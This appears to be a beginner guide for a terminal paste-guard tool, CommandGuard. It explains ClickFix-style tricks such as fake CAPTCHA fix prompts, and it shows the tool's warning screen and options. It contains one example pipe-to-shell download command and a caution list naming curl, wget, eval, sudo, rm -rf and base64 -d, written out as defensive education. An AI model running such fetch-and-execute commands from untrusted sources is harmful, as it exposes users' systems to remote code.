# Beginner Guide

This guide is for you if you are new to Linux and do not always know whether a terminal command is safe.

## Why Pasting Into The Terminal Can Be Risky

The terminal is powerful. A command can install programs, remove files, change settings, or run scripts.

That is useful when you understand what is happening. It is risky when someone tricks you into pasting a command you do not understand.

An attacker might say:

```text
Your browser is broken.
Open the terminal and paste this fix.
```

Or:

```text
Run this command to complete the CAPTCHA.
```

A real CAPTCHA normally does not ask you to run terminal commands. Treat that as a serious warning sign.

## The Problem In Plain English

Some commands do several things at once:

```bash
curl https://example.test/install.sh | bash
```

Read this as:

```text
Download something from the internet.
Give it directly to a program that runs commands.
```

You do not get a chance to read the script first.

Another trick is hiding command text:

```bash
echo SGVsbG8= | base64 -d
```

`base64` can hide text in a form that is hard to read. That is not always bad, but it is suspicious when the hidden text is executed immediately afterward.

## What CommandGuard Does For You

CommandGuard watches pasted text in a guarded terminal.

If the command looks normal, CommandGuard lets it through.

If the command looks risky, CommandGuard stops first and shows a warning. You might see:

```text
CommandGuard blocked a suspicious paste

High confidence: remote content is executed without being saved or reviewed.

Observed effects:
- Remote download
- Dynamic execution
```

This does not mean your computer is already infected. It means: stop for a moment, this command is doing something that is often dangerous.

## The Choices You Get

When CommandGuard warns you, you can choose:

```text
[c] Cancel
```

Cancel the paste. This is the safest choice when you do not understand the command.

```text
[s] Show decoded command
```

Show hidden or decoded text. This is useful when a command uses `base64`, hex, or compression.

```text
[e] Execute anyway
```

Run the command anyway. Only do this if you understand the command and trust the source.

## Simple Rules For Beginners

Use these rules when you are unsure:

- Do not paste terminal commands from a CAPTCHA.
- Do not paste a command from a chat message if you do not understand it.
- Be extra careful with `curl`, `wget`, `bash`, `sh`, `eval`, `sudo`, `rm -rf`, and `base64 -d`.
- Stop if a command downloads something and runs it immediately.
- Remember that `sudo` gives a command more power on your system.
- Prefer official documentation from the project or Linux distribution.

CommandGuard is a safety net. It does not replace careful thinking, but it gives you a better chance to notice a dangerous paste before it runs.
